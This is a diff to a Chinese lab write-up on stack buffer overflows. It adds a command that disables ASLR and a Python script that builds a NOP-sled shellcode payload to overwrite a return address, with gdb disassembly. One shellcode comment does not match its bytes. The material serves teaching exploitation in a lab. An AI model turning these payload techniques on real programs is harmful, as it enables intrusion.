@@ -11,7 +11,13 @@ gcc -z execstack -no-pie -fno-stack-protector -g -o ${filename} ${filename}.c
 
 因为我们首先要保证地址不变，其次要保证栈内的恶意代码是可以运行的。
 
-关闭PIE难度会大大增加，但不是不能做；关闭StackEXE后实验难度飙升至地狱难度,涉及复杂的提权过程。
+关闭PIE难度会大大增加，但不是不能做；关闭execstack后实验难度飙升至地狱难度,涉及复杂的提权过程。
+
+其次，难度0-3关闭栈空间地址随机化，命令如下：
+
+```bash
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
 
 ---
 
@@ -533,7 +539,6 @@ je     0x4012ec <test+70>
 
 但是我们直接就跳转到了 0x4012c5，根本没有对-0x8(%rbp)进行初始化，因此我们的payload还要对这个地址进行初始化。
 
-也就是说：博客的内容是大错特错的！！！典型的学术垃圾！！！误人子弟！！！
 
 那我们理论存在，实践开始！
 
@@ -548,7 +553,7 @@ je     0x4012ec <test+70>
 (gdb) disassemble getbuf
 Dump of assembler code for function getbuf:
    0x0000000000401272 <+0>:     push   %rbp
-=> 0x0000000000401273 <+1>:     mov    %rsp,%rbp
+   0x0000000000401273 <+1>:     mov    %rsp,%rbp
    0x0000000000401276 <+4>:     sub    $0x20,%rsp
    0x000000000040127a <+8>:     mov    $0x20,%esi
    0x000000000040127f <+13>:    lea    0xe32(%rip),%rax        # 0x4020b8
@@ -637,3 +642,85 @@ print("Payload written to boom.bin")
 --- calling test()---
 Please type a string (< 32 chars):Boom!:  success
 ```
+
+## 五、 512字节大缓冲区溢出
+
+### 前言
+这里的话我们看题目意思就是说我们要关闭掉我们的环境固化脚本，让栈帧可以在一定微小范围内进行波动。
+因为512字节已经足够大到覆盖掉偏移范围。
+因此我们只需要把我们的shellcode放置在payload最后，并且用NOP和现场值填充剩余的空间就行了。
+原理其实很简单，因为如果发生偏移了，那么也会偏移到后续的NOP指令开始执行代码，最终都会回到Shellcode上的。
+
+其实本人在没有解决栈帧微小偏移之前，用的就是这个方法。详细信息见下：
+```bash
+import sys
+
+shellcode = b'\x48\xc7\xc2\x2d\x00\x00\x00'  # mov $0x404030,%rdx
+shellcode += b'\x48\x89\x14\x25\x48\x40\x40\x00'  # mov %rdx,0x404048
+shellcode += b'\x68\x9e\x11\x40\x00'  # push $0x40119e
+shellcode += b'\xc3'  # ret
+
+buf_addr = 0x7fffffffd940
+
+buf_size = 32
+padding_size = buf_size - len(shellcode)
+
+
+payload = b'\x90' * padding_size
+payload += shellcode
+payload += b'\x90' * 8
+payload += buf_addr.to_bytes(8, byteorder='little')  # 覆盖返回地址
+
+with open(r'./payload/bang.bin', 'wb') as f:
+    f.write(payload)
+
+print("Payload written to bang.bin")
+```
+
+由于这个缓冲区太小了，没办法完全覆盖栈空间的变化，因此有时候我们认为的buf_addr其实是要比实际的buf_addr大的（至少大了 buf_size - len(shellcode) + 8 个字节，也就是NOP的字节数），因此也还是会报"Segmentation Default"之类的错误的。
+
+这个思路就是本题所涉及的思路。毕竟作者时间有限，没法完成后续的工作了，这部分工作就交给读者照葫芦画瓢地完成吧！
+
+别忘了，按照这个难度的题意，我们要开启栈空间随机化，并且尝试抛弃r.sh脚本的辅助试一试。至于抛弃r.sh脚本到底能否做得出来，是有待实验探寻的。毕竟操作系统日新月异，老教材的栈空间随机化以及运行环境导致的栈帧差异在如今的计算机环境上还是有很多不确定性的。
+
+如下命令用于开启栈空间随机化：
+```bash
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+
+### 1. 查看getbufn的反汇编代码，并且在响应的位置设置断点
+```bash
+(gdb) disas getbufn
+Dump of assembler code for function getbufn:
+   0x0000000000401324 <+0>:     push   %rbp
+   0x0000000000401325 <+1>:     mov    %rsp,%rbp
+   0x0000000000401328 <+4>:     sub    $0x200,%rsp
+   0x000000000040132f <+11>:    mov    $0x200,%esi
+   0x0000000000401334 <+16>:    lea    0xd7d(%rip),%rax        # 0x4020b8
+   0x000000000040133b <+23>:    mov    %rax,%rdi
+   0x000000000040133e <+26>:    mov    $0x0,%eax
+   0x0000000000401343 <+31>:    call   0x401040 <printf@plt>
+   0x0000000000401348 <+36>:    lea    -0x200(%rbp),%rax
+   0x000000000040134f <+43>:    mov    %rax,%rdi
+   0x0000000000401352 <+46>:    call   0x401156 <gets>
+   0x0000000000401357 <+51>:    mov    $0x1,%eax
+   0x000000000040135c <+56>:    leave
+   0x000000000040135d <+57>:    ret
+End of assembler dump.
+```
+
+```bash
+(gdb) break *0x401324
+Breakpoint 1 at 0x401324: file main.c, line 83.
+```
+
+```bash
+(gdb) break *0x401352
+Breakpoint 2 at 0x401352: file main.c, line 86.
+```
+
+### 未完待续...
+
+
+
